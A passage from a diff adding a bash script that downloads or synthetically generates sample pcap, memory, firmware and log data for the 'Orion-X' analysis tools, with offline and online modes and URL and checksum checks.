+# ---------------------------------------------------------------------------
+create_firmware_sample() {
+    local dir="$SAMPLES_DIR/firmware"
+    mkdir -p "$dir"
+
+    log "Creating firmware sample placeholder..."
+    python3 -c "
+import sys
+data = bytearray(2 * 1024 * 1024)  # 2 MB placeholder
+data[0:4] = b'\\x7fELF'
+msg = b'OpenWrt firmware placeholder'
+data[64:64+len(msg)] = msg
+sys.stdout.buffer.write(bytes(data))
+" > "$dir/sample_firmware.bin" 2>/dev/null || {
+        dd if=/dev/urandom of="$dir/sample_firmware.bin" bs=1M count=2 2>/dev/null
+    }
+    log "Created firmware sample: $dir/sample_firmware.bin"
+}
+
+# ---------------------------------------------------------------------------
+# Create log samples (online mode — same as offline, logs are always synthetic)
+# ---------------------------------------------------------------------------
+create_log_samples() {
+    generate_synthetic_logs "$SAMPLES_DIR/logs"
+}
+
+# ---------------------------------------------------------------------------
+# Offline mode: generate all synthetic data locally
+# ---------------------------------------------------------------------------
+run_offline() {
+    log "Running in offline mode — generating synthetic data in $SAMPLES_DIR"
+    mkdir -p "$SAMPLES_DIR"
+
+    generate_synthetic_pcap "$SAMPLES_DIR/pcaps"
+    generate_synthetic_memory "$SAMPLES_DIR/memory"
+    generate_synthetic_firmware "$SAMPLES_DIR/firmware"
+    generate_synthetic_logs "$SAMPLES_DIR/logs"
+
+    log "Offline sample generation completed in $SAMPLES_DIR"
+}
+
+# ---------------------------------------------------------------------------
+# Online mode: download / create all samples
+# ---------------------------------------------------------------------------
+run_online() {
+    log "Starting sample data download for Orion-X Phoenix Edition v2.0.0"
+    mkdir -p "$SAMPLES_DIR"
+
+    download_pcaps || log "PCAP download failed — continuing with other samples"
+    create_memory_sample
+    create_firmware_sample
+    create_log_samples
+
+    log "Sample data download/creation completed in $SAMPLES_DIR"
+}
+
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
+main() {
+    parse_args "$@"
+
+    # Handle --validate-urls (can run independently)
+    if [[ "$VALIDATE_URLS" == true ]]; then
+        validate_urls
+        exit $?
+    fi
+
+    # Handle --checksums (can run independently)
+    if [[ "$VERIFY_CHECKSUMS" == true ]]; then
+        verify_checksums
+        exit $?
+    fi
+
+    # Handle --offline vs default online mode
+    if [[ "$OFFLINE" == true ]]; then
+        run_offline
+    else
+        run_online
+    fi
+
+    echo "Sample data is available in $SAMPLES_DIR"
+    echo "Use these samples with the Orion-X analysis tools."
+}
+
+main "$@"
